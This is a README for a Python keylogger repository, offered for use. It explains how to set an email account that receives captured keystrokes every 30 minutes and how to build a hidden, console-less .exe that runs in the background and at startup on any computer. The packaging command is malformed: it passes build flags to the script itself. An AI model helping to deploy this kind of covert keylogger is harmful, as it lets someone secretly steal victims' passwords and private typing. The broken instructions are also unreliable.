# Advance-Keylogger-in-Python
This is an advance keylogger that I have written in python

# Usage - For Windows:
1. Download the zip file and extract it.
2. Open the keylogger.py file using any text editor
3. In 2nd last line of code , enter your email , and password there.
4. Use app password if two step verification is there on you email.
5. Run it using python interpreter, this program will send keystrokes to the email you specified earlier after every 30 minutes.
6. If you don't have python interpreter run following commands in Windows cmd
   ```bash
   curl -o python-installer.exe https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe
   python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
   python3 get-pip.py
   pip --version
   pip install pynput

# Usage - For Linux:
1. Run the following command on terminal
    ```bash
   git clone https://github.com/HamzaHashim12/Advance-Keylogger-in-Python.git

3. Open the keylogger.py file using any text editor
4. In 2nd last line of code , enter your email , and password there.
5. Use app password if two step verification is there on you email.
6. Run it using python interpreter, this program will send keystrokes to the email you specified earlier after every 30 minutes.
7. If you don't have python interpreter run following commands in Windows cmd
   ```bash
   sudo apt install python3
   sudo apt install python3-pip
   pip --version
   pip install pynput

# converting python file in .exe
1. To convert the about program into binary file with extension of .exe so it could run on any computer, follow these steps
2. Run the following commands on  terminal
   ```bash
   python3 keylogger.py --onefile --noconsole
3. This will create all an exe in dist folder in current directory
4. When that .exe will run, no terminal will be show but it will run in backgroud.
5. Don't worry it will also run on startup

